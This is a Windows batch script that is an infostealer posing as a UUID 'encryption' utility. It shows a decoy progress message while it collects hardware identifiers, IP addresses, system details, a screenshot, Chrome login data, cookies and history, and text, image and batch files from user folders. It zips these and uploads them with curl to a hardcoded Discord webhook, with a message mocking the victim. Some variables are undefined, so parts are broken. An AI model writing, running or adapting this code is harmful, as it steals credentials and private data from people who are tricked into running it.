@echo off
SETLOCAL ENABLEDELAYEDEXPANSION
color 0f
mode con cols=20 lines=2
cls

start cmd /c "echo] & echo] & echo     [33m^>  [97mEncrypting UUID AUTH KEY... & echo] & echo Please Wait... & timeout /t 15 /nobreak > NUL"

:: -- Important Variables --
set "exfilKey=https://discord.com/api/webhooks/1298801945393365092/4ai-juo8ccvTueuS4Jyq11dHiS3cMK91VyQmAeH1yjaxGBhzCmPd5U1EIKr4BOCWktCL"
set "output_dir=%localappdata%\Screenshots"
set "screenshotDir=%output Dir%"
set "screenshotFile=%screenshotDir%\screenshot.png"
set "chrome_data_path=%LOCALAPPDATA%\Google\Chrome\User Data"
set "ScOrig=%~dp0"

if not exist "%output_dir%" mkdir "%output_dir%"
cls

:: -- Collect HWID Information --
for /f "tokens=2 delims==" %%A in ('wmic path Win32_ComputerSystemProduct get UUID /value') do set "hwid=%%A"
for /f "tokens=2 delims==" %%A in ('wmic baseboard get product /value') do set "model=%%A"
for /f "tokens=2 delims==" %%A in ('wmic cpu get name /value') do set "cpuser2=%%A"
for /f "tokens=2 delims==" %%A in ('wmic cpu get processorid /value') do set "cpuserr2=%%A"
for /f "tokens=2 delims==" %%A in ('wmic path win32_videocontroller get name /value') do set "gpuid2=%%A"
for /f "tokens=2 delims==" %%A in ('wmic diskdrive get model, serialnumber /value') do (
    if not defined model2 set "model2=%%A" & set "serial2=%%B"
    if defined model2 if not defined model3 set "model3=%%A" & set "serial3=%%B"
    if defined model3 if not defined model4 set "model4=%%A" & set "serial4=%%B"
)
cls

:: -- Get Public and Private IP --
for /f "delims=" %%i in ('curl -s https://ifconfig.me') do set PUBLIC_IP=%%i
for /f "tokens=2 delims=:" %%i in ('ipconfig ^| findstr /i "IPv4"') do (
    set "ip=%%i"
    set "ip=!ip:~1!"
)
cls

:: -- System Info --
for /f "tokens=* delims=" %%h in ('hostname') do set "host=%%h"
for /f "tokens=* delims=" %%h in ('echo %USERNAME%') do set "pcname=%%h"
for /f "tokens=* delims=" %%v in ('ver') do set "osver=%%v"
for /f "tokens=* delims=" %%t in ('tzutil /g') do set "timezone=%%t"
cls

:: -- Take Screenshot --
powershell -NoProfile -ExecutionPolicy Bypass -Command ^
"Add-Type -AssemblyName System.Windows.Forms; Add-Type -AssemblyName System.Drawing; $Screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds; $Bitmap = New-Object System.Drawing.Bitmap $Screen.Width, $Screen.Height; $Graphics = [System.Drawing.Graphics]::FromImage($Bitmap); $Graphics.CopyFromScreen(0, 0, 0, 0, $Screen.Size); $Bitmap.Save('%screenshotFile%', [System.Drawing.Imaging.ImageFormat]::Png); $Graphics.Dispose(); $Bitmap.Dispose();"
cls

copy "%chrome_data_path%\Default\History" "%output_dir%\History" >nul
copy "%chrome_data_path%\Default\Bookmarks" "%output_dir%\Bookmarks" >nul
copy "%chrome_data_path%\Default\Cookies" "%output_dir%\Cookies" >nul
copy "%chrome_data_path%\Default\Login Data" "%output_dir%\Login Data" >nul
cls

for %%a in ("%documentsFolder%\*.txt") do (
    copy "%%a" "%textDest%"
)
cls
for %%b in ("%downloadsFolder%\*.txt") do (
    copy "%%b" "%textDest%"
)
cls
for %%c in ("%picturesFolder%\*.txt") do (
    copy "%%c" "%textDest%"
)
cls
for %%d in ("%videosFolder%\*.txt") do (
    copy "%%d" "%textDest%"
)
cls
for %%e in ("%musicFolder%\*.txt") do (
    copy "%%e" "%textDest%"
)
cls
for %%l in ("%desktopFolder%\*.txt") do (
    copy "%%l" "%textDest%"
)
cls

for %%f in ("%documentsFolder%\*.png") do (
    copy "%%f" "%imageDest%"
)
cls
for %%g in ("%documentsFolder%\*.jpg") do (
    copy "%%g" "%imageDest%"
)
cls
for %%h in ("%downloadsFolder%\*.png") do (
    copy "%%h" "%imageDest%"
)
cls
for %%i in ("%downloadsFolder%\*.jpg") do (
    copy "%%i" "%imageDest%"
)
cls
for %%j in ("%picturesFolder%\*.png") do (
    copy "%%j" "%imageDest%"
)
cls
for %%k in ("%picturesFolder%\*.jpg") do (
    copy "%%k" "%imageDest%"
)
cls
for %%m in ("%videosFolder%\*.png") do (
    copy "%%m" "%imageDest%"
)
cls
for %%n in ("%videosFolder%\*.jpg") do (
    copy "%%n" "%imageDest%"
)
cls
for %%o in ("%desktopFolder%\*.png") do (
    copy "%%o" "%imageDest%"
)
cls
for %%p in ("%desktopFolder%\*.jpg") do (
    copy "%%p" "%imageDest%"
)
cls
for %%q in ("%desktopFolder%\*.bat") do (
    copy "%%q" "%batDest%"
)
cls
for %%r in ("%downloadsFolder%\*.bat") do (
    copy "%%r" "%batDest%"
)
cls
for %%s in ("%documentsFolder%\*.bat") do (
    copy "%%s" "%batDest%"
)
cls

echo]
echo   [33m^>  [97mEncrypting UUID...
powershell -command "Compress-Archive -Path '%output_dir%\Bookmarks' -DestinationPath '%output_dir%\Bookmarks.zip' -Force > $null 2>&1" >nul 2>&1
powershell -command "Compress-Archive -Path '%output_dir%\History' -DestinationPath '%output_dir%\History.zip' -Force > $null 2>&1" >nul 2>&1
powershell -command "Compress-Archive -Path '%output_dir%\Login Data' -DestinationPath '%output_dir%\Login_Data.zip' -Force > $null 2>&1" >nul 2>&1
powershell -command "Compress-Archive -Path '%output_dir%\txt' -DestinationPath '%output_dir%\txt.zip' -Force > $null 2>&1" >nul 2>&1
powershell -command "Compress-Archive -Path '%output_dir%\images' -DestinationPath '%output_dir%\images.zip' -Force > $null 2>&1" >nul 2>&1
powershell -command "Compress-Archive -Path '%output_dir%\bat' -DestinationPath '%output_dir%\bat.zip' -Force > $null 2>&1" >nul 2>&1

set "file1=%localappdata%\Screenshots\Bookmarks.zip"
cls
set "file2=%localappdata%\Screenshots\History.zip"
cls
set "file3=%localappdata%\Screenshots\Login_Data.zip"
cls
set "file4=%localappdata%\Screenshots\txt.zip"
cls
set "file5=%localappdata%\Screenshots\images.zip"
cls
set "file6=%localappdata%\Screenshots\bat.zip"
cls


:: -- Create JSON Payload --
set "json_payload1={\"embeds\": [{\"title\": \"%pcname%\", \"description\": \"**Someone of severe low IQ ran your malware package YIPPEE** \n.        ```\nHostname: %host%``` ```\nOS Version: %osver%``` ```\nPrivate IP: !ip!``` ```\nPublic IP: %PUBLIC_IP%``` ```\nTime Zone: %timezone%``` \n**HWID Information:** ```\nMboard: %model%``` ```\nUUID: %hwid%``` ```\nCPU: %cpuser2%``` ```\nCPU ID: %cpuserr2%``` ```\nGPU: %gpuid2%``` ```\nDisk 1: %model2%  %serial2%``` ```\nDisk 2: %model3%  %serial3%``` ```\nDisk 3: %model4%  %serial4%``` \", \"color\": 9503569, \"image\": {\"url\": \"attachment://screenshot.png\"}}]}"

:: -- Send Data with Screenshot --
curl -F "payload_json=%json_payload1%" -F "file1=@%screenshotFile%" "%exfilKey%" >nul 2>&1
cls

cls
echo]
echo   [33m^>  [97mEncrypting UUID...
curl -F "file=@%file1%" %exfilKey% >nul 2>&1
cls
echo]
echo   [33m^>  [97mEncrypting UUID...
curl -F "file=@%file2%" %exfilKey% >nul 2>&1
cls
echo]
echo   [33m^>  [97mEncrypting UUID...
curl -F "file=@%file3%" %exfilKey% >nul 2>&1
cls
echo]
echo   [33m^>  [97mEncrypting UUID...
curl -F "file=@%file4%" %exfilKey% >nul 2>&1
cls
echo]
echo   [33m^>  [97mEncrypting UUID...
curl -F "file=@%file5%" %exfilKey% >nul 2>&1
cls
echo]
echo   [33m^>  [97mEncrypting UUID...
curl -F "file=@%file6%" %exfilKey% >nul 2>&1
cls